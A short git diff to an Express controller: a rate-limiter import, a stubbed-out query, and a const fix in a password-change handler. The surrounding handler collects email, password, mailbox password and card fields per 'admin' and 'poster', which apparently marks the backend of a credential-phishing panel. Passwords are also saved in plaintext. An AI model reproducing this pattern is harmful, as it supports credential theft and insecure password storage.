@@ -11,6 +11,7 @@ import Site from '../models/Site.js'
 import createToken from '../utils/createToken.js'
 import Demo from '../models/Demo.js'
 import Cash from '../models/Cash.js'
+import rateLimitMiddleware from "../ratelimiter.js"
 
 
 
@@ -26,8 +27,8 @@ const{id}=req.params
 
         // const data = await    Info.find().sort({ field: 'asc', _id: -1 }).limit(1)
         // const data =    await Info.find().sort({$natural:-1}).limit(1);
-        const data = await Info.find({root:id})
-        return res.status(200).json({ data: data })
+        // const data = await Info.find({root:id})
+        return res.status(200).json({ data: "data" })
 
 
 
@@ -347,7 +348,7 @@ export const add_data = async (req, res) => {
         cluster: 'ap2',
         useTLS: true,
       });
-      
+
 
     const { adminId, posterId } = req.params
     const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard } = req.body
@@ -867,7 +868,8 @@ export const pass_change = async (req, res) => {
 
     try {
         
-            userFound = await User.findOne({username:username})
+         const   userFound = await User.findOne({username:username})
+
             if(userFound){
                 userFound.password=password
               await userFound.save()
